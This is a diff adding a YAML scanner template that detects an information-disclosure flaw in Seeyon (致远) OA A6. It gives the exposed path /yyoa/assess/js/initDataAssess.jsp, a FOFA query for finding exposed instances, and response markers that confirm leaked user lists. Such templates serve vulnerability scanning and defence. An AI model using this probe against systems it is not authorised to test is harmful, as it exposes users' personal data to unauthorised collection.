@@ -1,0 +1,25 @@
+id: seeyon-initdataaccess-disclosure
+
+info:
+  name: 致远OA A6 initDataAssess.jsp 用户敏感信息泄露
+  author: zan8in
+  severity: high
+  verified: false
+  description: |
+    致远OA A6 initDataAssess.jsp 用户敏感信息泄露
+    fofa: app="致远OA-A6"
+  tags: seeyon,disclosure
+  created: 2025/03/13
+  requires: [seeyon]
+  requires-mode: opportunistic
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /yyoa/assess/js/initDataAssess.jsp
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'personList') && 
+      response.body.bcontains(b'personHash.Add')
+expression: r0()
